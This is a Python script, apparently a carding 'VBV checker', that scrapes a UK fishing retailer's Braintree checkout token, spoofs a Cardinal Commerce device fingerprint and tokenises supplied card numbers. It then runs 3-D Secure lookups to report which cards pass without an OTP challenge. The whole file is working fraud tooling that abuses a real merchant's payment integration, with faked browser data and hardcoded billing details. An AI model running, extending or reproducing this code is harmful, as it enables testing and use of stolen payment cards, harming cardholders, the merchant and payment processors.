def vbv(ccx):
	import requests,re,base64,jwt,json
	cc=ccx
	def get_ref():
		with open('gates.json', 'r') as file:
			json_dataa = json.load(file)
		cookies = {
		    'PHPSESSID': 'ebd4715f9d785f07f144f5d8c841badc'
		}
		headers = {
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		response = requests.get('https://www.sportfish.co.uk/checkout/', cookies=cookies, headers=headers)
		no=re.findall(r'"clientToken":"(.*?)"',response.text)[0]
		encoded_text = no
		decoded_text = base64.b64decode(encoded_text).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
		headers = {
		    'authority': 'payments.braintree-api.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'authorization': f'Bearer {au}',
		    'braintree-version': '2018-05-10',
		    'content-type': 'application/json',
		    'origin': 'https://www.sportfish.co.uk',
		    'referer': 'https://www.sportfish.co.uk/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		json_data = {
		    'clientSdkMetadata': {
		        'source': 'client',
		        'integration': 'custom',
		        'sessionId': 'e4ea0503-2df6-459c-b10c-f2c18dd8bccd',
		    },
		    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
		    'operationName': 'ClientConfiguration',
		}
		response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		cardnal=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
		headers = {
		    'authority': 'centinelapi.cardinalcommerce.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'content-type': 'application/json;charset=UTF-8',
		    'origin': 'https://www.sportfish.co.uk',
		    'referer': 'https://www.sportfish.co.uk/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		    'x-cardinal-tid': 'Tid-254fb674-0925-4e3e-9afa-fa4d4326757d',
		}
		json_data = {
		    'BrowserPayload': {
		        'Order': {
		            'OrderDetails': {},
		            'Consumer': {
		                'BillingAddress': {},
		                'ShippingAddress': {},
		                'Account': {},
		            },
		            'Cart': [],
		            'Token': {},
		            'Authorization': {},
		            'Options': {},
		            'CCAExtension': {},
		        },
		        'SupportsAlternativePayments': {
		            'cca': True,
		            'hostedFields': False,
		            'applepay': False,
		            'discoverwallet': False,
		            'wallet': False,
		            'paypal': False,
		            'visacheckout': False,
		        },
		    },
		    'Client': {
		        'Agent': 'SongbirdJS',
		        'Version': '1.35.0',
		    },
		    'ConsumerSessionId': None,
		    'ServerJWT': cardnal,
		}
		response = requests.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
		payload = response.json()['CardinalJWT']
		payload_dict = jwt.decode(payload, options={"verify_signature": False})
		ref = payload_dict['ReferenceId']
		json_dataa['up']['re']=ref
		json_dataa['up']['au']=au
		with open('gates.json', 'w') as json_file:
			json.dump(json_dataa, json_file, ensure_ascii=False, indent=4)
		headers = {
		    'authority': 'geo.cardinalcommerce.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'content-type': 'application/json',
		    'origin': 'https://geo.cardinalcommerce.com',
		    'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5f45accd4c6a414cafc1ae4e&tmEventType=PAYMENT&referenceId={ref}&geolocation=false&origin=Songbird',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		    'x-requested-with': 'XMLHttpRequest',
		}
		json_data = {
		    'Cookies': {
		        'Legacy': True,
		        'LocalStorage': True,
		        'SessionStorage': True,
		    },
		    'DeviceChannel': 'Browser',
		    'Extended': {
		        'Browser': {
		            'Adblock': True,
		            'AvailableJsFonts': [],
		            'DoNotTrack': 'unknown',
		            'JavaEnabled': False,
		        },
		        'Device': {
		            'ColorDepth': 24,
		            'Cpu': 'unknown',
		            'Platform': 'Linux armv81',
		            'TouchSupport': {
		                'MaxTouchPoints': 5,
		                'OnTouchStartAvailable': True,
		                'TouchEventCreationSuccessful': True,
		            },
		        },
		    },
		    'Fingerprint': '4291e9424912bfb097796e676a43a259',
		    'FingerprintingTime': 1249,
		    'FingerprintDetails': {
		        'Version': '1.5.1',
		    },
		    'Language': 'en-US',
		    'Latitude': None,
		    'Longitude': None,
		    'OrgUnitId': '5f45accd4c6a414cafc1ae4e',
		    'Origin': 'Songbird',
		    'Plugins': [],
		    'ReferenceId': ref,
		    'Referrer': 'https://www.sportfish.co.uk/',
		    'Screen': {
		        'FakedResolution': False,
		        'Ratio': 2.2213740458015265,
		        'Resolution': '873x393',
		        'UsableResolution': '873x393',
		        'CCAScreenSize': '02',
		    },
		    'CallSignEnabled': None,
		    'ThreatMetrixEnabled': False,
		    'ThreatMetrixEventType': 'PAYMENT',
		    'ThreatMetrixAlias': 'Default',
		    'TimeOffset': -120,
		    'UserAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		    'UserAgentDetails': {
		        'FakedOS': False,
		        'FakedBrowser': False,
		    },
		    'BinSessionId': 'add5c63e-e8fb-4e9c-a235-b13f64a74f69',
		}
		response = requests.post(
		    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
		    headers=headers,
		    json=json_data,
		)
		hi=result(cc)
		return hi
	def result(cc):
		n=cc.split('|')[0]
		with open('gates.json', 'r') as file:
			json_data = json.load(file)
		au=(json_data['up']['au'])
		ref=(json_data['up']['re'])
		headers = {
		    'authority': 'payments.braintree-api.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'authorization': f'Bearer {au}',
		    'braintree-version': '2018-05-10',
		    'content-type': 'application/json',
		    'origin': 'https://assets.braintreegateway.com',
		    'referer': 'https://assets.braintreegateway.com/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		json_data = {
		    'clientSdkMetadata': {
		        'source': 'client',
		        'integration': 'custom',
		        'sessionId': 'e4ea0503-2df6-459c-b10c-f2c18dd8bccd',
		    },
		    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
		    'variables': {
		        'input': {
		            'creditCard': {
		                'number': n,
		                'expirationMonth': '12',
		                'expirationYear': '2029',
		                'cvv': '982',
		            },
		            'options': {
		                'validate': False,
		            },
		        },
		    },
		    'operationName': 'TokenizeCreditCard',
		}
		response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		try:
			tok = response.json()['data']['tokenizeCreditCard']['token']
		except:
			get_ref()
		headers = {
		    'authority': 'api.braintreegateway.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'content-type': 'application/json',
		    'origin': 'https://www.sportfish.co.uk',
		    'referer': 'https://www.sportfish.co.uk/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		json_data = {
		    'amount': '29.99',
		    'additionalInfo': {
		        'billingLine1': '10 Sillerton House',
		        'billingLine2': '16 Albyn Terrace',
		        'billingCity': 'Aberdeen',
		        'billingState': '',
		        'billingPostalCode': 'AB10 1YP',
		        'billingCountryCode': 'US',
		        'billingPhoneNumber': '9108749652',
		        'billingGivenName': '\\u006a\\u0061\\u0063\\u006b\\u0073\\u006f\\u006e',
		        'billingSurname': '\\u004d\\u0061\\u0067\\u0065\\u006e\\u0074\\u006f',
		    },
		    'challengeRequested': True,
		    'bin': '493452',
		    'dfReferenceId': ref,
		    'clientMetadata': {
		        'requestedThreeDSecureVersion': '2',
		        'sdkVersion': 'web/3.94.0',
		        'cardinalDeviceDataCollectionTimeElapsed': 560,
		        'issuerDeviceDataCollectionTimeElapsed': 669,
		        'issuerDeviceDataCollectionResult': True,
		    },
		    'authorizationFingerprint': au,
		    'braintreeLibraryVersion': 'braintree/web/3.94.0',
		    '_meta': {
		        'merchantAppId': 'www.sportfish.co.uk',
		        'platform': 'web',
		        'sdkVersion': '3.94.0',
		        'source': 'client',
		        'integration': 'custom',
		        'integrationType': 'custom',
		        'sessionId': 'e4ea0503-2df6-459c-b10c-f2c18dd8bccd',
		    },
		}
		response = requests.post(
		    f'https://api.braintreegateway.com/merchants/fs8wxy78pkvx72rh/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
		    headers=headers,
		    json=json_data,
		)
		try:
			string=response.json()['paymentMethod']['threeDSecureInfo']['status']
		except:
			return 'Error'
		formatted_string = string.replace("_", " ").title()
		otp=(formatted_string)
		if 'Successful' in otp or 'Unavailable' in  otp or 'successful' in otp:
			return otp+' ✅'
		else:
			return otp+' ❌'
	return result(cc)
